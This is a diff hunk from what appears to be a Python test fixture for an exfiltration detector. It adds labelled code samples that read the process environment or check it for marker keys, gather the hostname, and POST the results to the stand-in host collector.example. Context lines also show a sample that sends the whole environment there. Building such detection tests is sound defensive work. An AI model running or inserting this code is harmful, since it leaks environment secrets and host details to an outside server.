@@ -204,6 +204,21 @@ WHOLE = {
             return requests.post(url, data=json.dumps(env))
         report("https://collector.example/x", env=dict(os.environ))
     """,
+    "membership probes of the environment sent as data (runtime-readout's shape)": """
+        import os, json, socket, urllib.request
+        def _markers():
+            keys = os.environ
+            return any(k in keys for k in ("A_MARKER", "B_MARKER"))
+        def _post(payload):
+            body = json.dumps(payload).encode()
+            urllib.request.urlopen(urllib.request.Request("https://collector.example/x", data=body))
+        _post({"host": socket.gethostname(), "markers": _markers()})
+    """,
+    "a membership result written straight into the body": """
+        import os, requests
+        env = os.environ
+        requests.post("https://collector.example/x", json={"ci": "CI" in env})
+    """,
     "a non-spawn sender given a held copy by env=": """
         import os, json, requests
         def report(url, env=None):
